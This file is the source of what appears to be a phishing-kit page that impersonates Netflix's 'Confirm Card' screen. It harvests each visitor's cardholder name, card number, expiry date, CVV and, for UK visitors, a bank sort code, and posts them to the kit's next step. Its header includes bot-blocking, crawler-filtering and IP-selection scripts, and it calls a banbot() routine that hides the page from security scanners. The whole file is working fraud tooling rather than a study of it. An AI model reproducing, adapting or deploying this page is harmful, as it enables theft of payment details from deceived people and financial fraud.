<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Confirm Card - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="../oille/nul.css"><link type="text/css" rel="stylesheet" href="../oille/null.css"><link rel="shortcut icon" href="../fnset/favicon.ico">
<style>
	*{box-sizing:border-box;}	
	.svg-nfLogo .svg-icon-netflix-logo{box-sizing:content-box;}
	html{height:auto;}
	body{margin:0px;padding:0;height:100vh;}
	.thead{height:;width:100%;text-align:left;}
	.mainviewpar{padding:0;position:relative;background-color:#f1f1f1;}
    .mainview{width:100%;max-width:639px;margin:0 auto;padding:10px 0;}
	.mainviewchild{margin:0 10px;padding:10px 20px;text-align:center;background-color:#fff;border: 1px solid #dcdde0;}
	@media only screen and (min-width:500px){.mainviewchild{}}
	@media only screen and (min-height:900px){.mainviewchild{margin:50px auto;}}
	.header_logo{display:inline-block;width:150px;height:45px;background:url('../fnset/hiconb.png') no-repeat;background-position:0 -9px; background-size:100%;}
	.vx_modal-header h1{font-size:1.6rem;;font-weight: 400;text-transform: none;font-family: Arial,sans-serif;border-bottom: 2px solid #dcdde0;padding-bottom:10px;}
	
	form{max-width:360px;margin:auto}
    input{width: 100%;height: 44px;padding: 0 15px ;line-height:44px;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 5px;font-size: 15px;background-color:#333;text-transform:capitalize;color: #ccc;}	
	select{width: 100%;height:44px;padding: 0 15px;color:#686159;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 6px;font-size: 14px;background-color:#333;-moz-padding-start: 0.5rem;-webkit-appearance: none;-moz-appearance: none;text-transform:capitalize;color: #ccc;}
    input:focus{border: 1px solid #009CDE;border-radius: 6px;outline:0;z-index:100;padding: 15px 18px 0;transition:padding 0.3s;}
    select:focus{border: 2px solid #009CDE;border-radius: 6px;outline:0;padding: 15px 18px 0;transition:padding 0.3s;}
	.notcapitalized{text-transform:none;}
	.cardImage_medium{margin:0px auto 10px;display:block;}
	.vx_form-group{position:relative;}
	.vx_form-group label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 98%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.vx_form-group input:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.hasError,.hasError:focus{border: 1px solid #d20000;outline:0;padding: 15px 18px 0;transition:border 0.3s}
	input.hasError~label, input.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	select.hasError~label, select.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.vx_form-group input.hasContent{border: 1px solid #B7B6B6;;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.vx_form-group input.hasContent:focus{border: 1px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown{position:relative;}
	.ppvx_dropdown label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 50% 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 100%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.ppvx_dropdown select:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.ppvx_dropdown::before{content: '';width: 10px;height: 10px;line-height: 0;border:1px solid;border-color:transparent transparent #686159 #686159;position: absolute;top:13px;right: 0.75rem;z-index: 2;transform:rotate(-45deg);}
	.ppvx_dropdown select.hasContent{outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown select.hasContent:focus{border: 2px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.btn_info{width:100%;height:44px;box-sizing:border-box;margin-bottom: 10px;border-radius: 1.5em;border:0;text-transform: capitalize;margin-top: 0; background-color:#E50914 !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;display: inline-block;min-width: 30px;padding: 4px 15px;text-align: center;}
	.table-row{display:table;table-layout:fixed;}
	.table-row > div{display:table-cell;}
	.table-col-xs-10{width:;}
	.table-col-xs-2{width:16%;min-height:1px;font-size:15px;padding:0 1% 0 1%;text-align:left;}
	.equal{width:50%;display:;float:left} .equal #city{border-radius:6px 0 0 6px;} .equal #zip{border-radius:0 6px 6px 0;border-left:;}
	.equal #zip:focus{border-left:1px solid #009CDE;}  .equal #zip.hasError{border-left:1px solid #d20000;}
	.phone div{float:left;} .phone .ppvx_dropdown{width:35%;} .phone .vx_form-group{width:65%;} .phone select{border-radius:6px 0 0 6px;} .phone select.hasContent:focus{border-width:1px;} .phone input{border-left:;border-radius:0 6px 6px 0;} .phone input:focus{border-left:1px solid #009CDE;} .phone input.hasError{border-left:1px solid #d20000;} .phone .ppvx_dropdown::before{height:5px;width:5px;top:18px;}
	
	.rectangleLogo_small{width:3.2em;height:2.1em;margin:0 auto;border-radius:4px;display:inline-block;box-shadow:0 1px 2px 0 rgba(0, 0, 0, 0.15);position:relative}
	.csc-image::after {content:"";position:absolute;width:3.2em;height:3em;top:0;right:0;background:url('../fnset/sprite_logos_wallet_2x.png') no-repeat;background-position:0px -731px;background-size:153%;}
	.hide{display:none;}
	.notification-critical{background: #E87C03;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    font-size: 14px;
    margin: 0 0 16px;
	padding: 10px 20px;
    vertical-align: middle;
    padding: 20px 10px;
    color: #fff;}
	.transitioning{height:100%;background-color:rgba(190,190,190,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #E50914;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:730px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
		.login-body:after {
		content: "";
		height: 106px;
		display: block;
		}
		.login-body {
		margin: 0 auto -236px;
		min-height: 100vh;
		background-color: transparent;
		max-width: 700px;
			}
	}
	#cvvcont,#expcont{width:48%;display:;float:left} #cvvcont{float:right;}
	.cvv{z-index:2;border-radius:50%;width:30px;height:30px;right:20px;position:absolute;top:8px;background-color:#555;color:#fff;font-weight:900;display:inline-block;line-height:30px;font-size:20px;text-align:center;}
	.cvv:active,.cvv:hover{background-color:#555;transition:background-color 0.3s;}
	.popbase{position:relative;}
	.popup{position:absolute;top:-50%;right:48px;margin:auto;width:80%;display:none;max-width:80%;border:1px solid #999;border-radius:0px;background-color:#fff;z-index:4;text-align:left;padding:5px;font-size:14px;box-shadow:7px 7px 7px ;} .popup>span{background-color:#777;color:#fff;padding:3px;border-radius:5px;width:30px;display:block;margin:auto;text-align:center;}
	.popup::after{content:'';line-height: 0;border:10px solid;border-color:transparent transparent transparent #686159;position: absolute;top:13px;right: -20px;z-index: 2;}
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:680px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.isvbv{padding:0;box-sizing:border-box;margin-bottom: 12px;font-size: 13px;background-color:#fff;text-transform:capitalize;}
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
.hybrid-login-form.hybrid-login-form-signup {
    min-height: 400px;
	}}
  
</style>

</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="fnset/website_small.jpg" srcset="../fnset/website_small.jpg 1000w, ../fnset/website_medium.jpg 1500w, ../fnset/website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1>Confirm Card details</h1><div class="ui-message-container <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>

<form action="sca" id="mainloginform" method="POST" onsubmit="return validate();">
<div style="text-align:right;color:#37a237;margin:3px;font-weight:600;height:15px;"><span style="vertical-align:2px;padding-left:4px;">secured</span></div>
<div class="vx_form-group vx_floatingLabel_active" data-label-content="Credit card Name"><input type="text" id="cardname" name="cardname" class="" placeholder="Enter name on card" autocomplete="off" maxlength="30" oninput="hasCtnt()" value="<?php $_SESSION['fname']?>" onclick="hasCtnt()" required="required"/><label class="floatingLabel" for="cardname">Credit / Debit Card Name</label></div>

<div class="vx_form-group vx_floatingLabel_active" data-label-content="Credit card number"><input type="tel" id="cardNumber" name="cardnumber" class="" placeholder="Enter card number" autocomplete="off" maxlength="16" onkeypress="stoplen(19)" oninput="demcnum();hasCtnt()" onclick="hasCtnt()" value="" required="required"/><label class="floatingLabel" for="cardNumber">Credit / Debit Card Number</label></div>

<div class="popbase"><div class="vx_form-group vx_floatingLabel_active" id="expcont"><input type="tel" id="expDate" name="expdate" class="" placeholder="MM/YY" autocomplete="off" value="" onclick="hasCtnt()" onkeypress="stoplen(5)" oninput="demexpDate();hasCtnt()" maxlength="5" required="required" pattern="^\d{2}[/\-\.]?\d{2}$"/></><label class="floatingLabel" for="expDate">Expiration Date</label></div>

<div class="table-container" id="cvvcont"><div class="table-row"><div class="table-col-xs-10"><div class="vx_form-group vx_floatingLabel_active" data-label-content="CCV"><input type="tel" id="cvv" name="cvv" class="" placeholder="CVV" autocomplete="off" maxlength="4" onkeypress="stoplen(4)" oninput="innumlen(this.value);hasCtnt()" onclick="hasCtnt()" value="" /><label class="floatingLabel" for="cvv">CCV</label><span role="button" onfocus="cvvquery()" onblur="popupclear()" class="cvv" onclick="cvvquery()">?</span>
</div></div> </div></div><div class="popup" id="popup"></div></div>
<div style="clear:left"></div>

<?php
if($_SESSION['country']=="United Kingdom"){echo '<div class="vx_form-group"><input type="tel" id="sortcode" maxlength="8" onclick="demsort();hasCtnt();" onchange="demsort()" name="sort_code" placeholder="XX-XX-XX" onkeypress="stoplen(8)" oninput="demsort();innumlen(this.value);hasCtnt()" required="required"/><label class="floatingLabel" for="sortcode">Sort Code</label></div>';
}; ?>

<input type="hidden" name="hsub" value="yes"/>
<button type="submit" name="detailsSubmit" data-track="{}" class="btn_info" title="">NEXT</button>
</form>
</div>



</div>

</div></div>
<div class="transitioning hide" id="loader">
<div class="loader">
&nbsp;
</div>
</div>
</div>
</div></div>

<script type="text/javascript">
"use strict"
document.getElementById("mainloginform").setAttribute("novalidate",true);
var popup=document.getElementById("popup");
var bh=window.innerHeight;
function load(){var t = document.getElementById("loader");t.className="transitioning";};
function stopload(){var t = document.getElementById("loader");t.className="transitioning hide";};
function hasCtnt(){var tgt=event.target;if(tgt.value!=""){tgt.className="hasContent"} else{tgt.className=""};};
function disperr(i){i.className=" hasError";};

function validate(){var exp=document.getElementById("expDate");var err = document.getElementById("errnotif");load();var self=document.getElementById("mainloginform"); var input = self.querySelectorAll("input[required]");var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){setTimeout(function(){input[emptylist[0]].focus();stopload();err.innerHTML="All fields are required !";for(var i of emptylist){disperr(input[i])};},1500);return false;} else{if(input[1].value.length<16){setTimeout(function(){stopload();err.innerHTML="Wrong Entries, Please check and try again";disperr(input[1]);},1500);return false;} else if(exp.value.length!=5 ||  /^\d{2}[\/\-\.]?\d{2}$/.test(exp.value)==false){setTimeout(function(){stopload();err.innerHTML="Expiry Date Must be in MM/YY format";disperr(exp);},1500);return false;} else{return true;};}; };
function demsort(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/-/g,'').split('');
if(event.inputType=="insertText"){
for(var i=0;i < mval.length;i++){if(i==1 || i==3){mval[i]=mval[i]+'-';};};
if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else{event.target.value=mval.join('');};
};};

function popupclear(){var popup=document.getElementById("popup");popup.style.display="none"};

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else{event.target.value=mval.join('');};
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};
<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}

function cvvquery(){if(popup.style.display=="block"){popupclear();} else{popup.style.display="block";}; popup.innerHTML="<b>How to find the CVV</b><br/><br/>Visa, Mastercard, Discover, and UnionPay display the three-digit CVV number on the back of the card, to the right of the signature strip.<br/><br/> American Express displays the four-digit CVV number on the front of the card, just above and to the right of the card number. <br/><br/><span onclick='popupclear()'>ok</span>";};
</script>
<div></div></body></html>